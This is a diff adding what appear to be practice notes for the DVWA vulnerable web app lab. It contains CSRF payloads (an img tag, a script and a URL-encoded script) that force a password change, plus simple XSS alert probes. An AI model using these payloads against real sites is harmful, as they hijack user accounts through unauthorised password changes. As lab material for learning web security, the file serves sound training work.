@@ -1,0 +1,24 @@
+<img src="http://192.168.0.105/dvwa/vulnerabilities/csrf/?password_new=pissward&password_conf=pissward&Change=Change">
+
+
+URL = "http://192.168.0.105/dvwa/vulnerabilities/csrf/test_credentials.php"
+
+"username":"test"&password=passboard&Login=Login
+
+<script>var foo = new Image();foo.src = "http://192.168.0.105/dvwa/vulnerabilities/csrf/?password_new=boomboom&password_conf=boomboom&Change=Change";</script>
+
+
+
+%3c%73%63%72%69%70%74%3e%76%61%72%20%66%6f%6f%20%3d%20%6e%65%77%20%49%6d%61%67%65%28%29%3b%66%6f%6f%2e%73%72%63%20%3d%20%22%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%30%2e%31%30%35%2f%64%76%77%61%2f%76%75%6c%6e%65%72%61%62%69%6c%69%74%69%65%73%2f%63%73%72%66%2f%3f%70%61%73%73%77%6f%72%64%5f%6e%65%77%3d%62%6f%6f%6d%62%6f%6f%6d%26%70%61%73%73%77%6f%72%64%5f%63%6f%6e%66%3d%62%6f%6f%6d%62%6f%6f%6d%26%43%68%61%6e%67%65%3d%43%68%61%6e%67%65%22%3b%3c%2f%73%63%72%69%70%74%3e
+
+
+
+
+<script>alert(%271%27);</script>
+
+<script>alert(1);</script>
+
+
+<script src="<a href="http://localhost"></script>
+
+
